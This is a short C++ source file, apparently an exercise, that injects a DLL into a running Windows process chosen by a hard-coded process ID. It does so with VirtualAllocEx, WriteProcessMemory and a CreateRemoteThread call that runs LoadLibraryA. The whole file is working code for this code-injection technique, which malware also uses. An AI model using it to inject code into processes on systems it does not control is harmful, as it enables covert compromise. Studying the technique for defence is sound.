/*****************************************************************************************************\
File Name : dll_injection.cpp
Author    : Ilay Gilman
Purpose   : injecting dll to a remote (running) process
\*****************************************************************************************************/

/* Include Section ***********************************************************************************/
#include <windows.h>
#include <stdio.h>

/* Definition Section ********************************************************************************/
#define BUFSIZE (1000)
#define PROC_ID (6280)

int main()
{
	CHAR buffer[BUFSIZE] = "";
	CHAR **lppPart = NULL;
	// Get full path of DLL to inject
	DWORD pathLen = GetFullPathNameA((LPCSTR) "injecteddll.dll",
									 BUFSIZE,
									 (LPSTR)buffer,
									 NULL);
	if (pathLen == 0)
	{
		printf("GetFullPathName failed (%d)\n", GetLastError());
		return 1;
	}
	// Get LoadLibrary function address � the address doesn't change at remote process
	HMODULE hModule = GetModuleHandleA((LPCSTR) "Kernel32.dll");
	if (hModule == NULL)
	{
		printf("GetModuleHandle failed (%d)\n", GetLastError());
		return 2;
	}
	// Get the function address
	LPTHREAD_START_ROUTINE addrLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "LoadLibraryA");
	if (addrLoadLibrary == NULL)
	{
		printf("GetProcAddress failed (%d)\n", GetLastError());
		return 3;
	}
	// Open remote process
	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROC_ID);
	if (proc == NULL)
	{
		printf("OpenProcess failed (%d)\n", GetLastError());
		return 4;
	}
	// Get a pointer to memory location in remote process, big enough to store the injected DLL path
	PVOID memAddr = (PVOID)VirtualAllocEx(proc,						// handle to the process
										  NULL,						// random place in memory
										  pathLen,					// size of the allocation
										  MEM_COMMIT | MEM_RESERVE, // the type of allocation
										  PAGE_READWRITE);			// memory protection
	if (NULL == memAddr)
	{
		printf("VirtualAllocEx failed (%d)\n", GetLastError());
		return 5;
	}
	// Write DLL name to remote process memory
	BOOL isInMemory = WriteProcessMemory(proc,	  // handle to the process
										 memAddr, // pointer to the base address in the specified process to which data is written
										 buffer,  // a pointer to the buffer that contains data to be written
										 pathLen, // the number of bytes to be written to the specified process
										 NULL);
	if (0 == isInMemory)
	{
		printf("WriteProcessMemory failed (%d)\n", GetLastError());
		return 6;
	}
	// Open remote thread - executing LoadLibrary, with parameter DLL name, that will trigger DLLMain
	HANDLE hRemote = CreateRemoteThread(proc,			 // in which process
										NULL,			 // default security
										0,				 // default size
										addrLoadLibrary, // function pointer as the starting point of the created thread
										memAddr,		 // pointer to a variable to the above function
										0,				 // running immediatelt after creation
										NULL);			 // no identifier returned
	if (NULL == hRemote)
	{
		printf("CreateRemoteThread failed (%d)\n", GetLastError());
		return 7;
	}

	WaitForSingleObject(hRemote, INFINITE);
	CloseHandle(hRemote);

	return 0;
}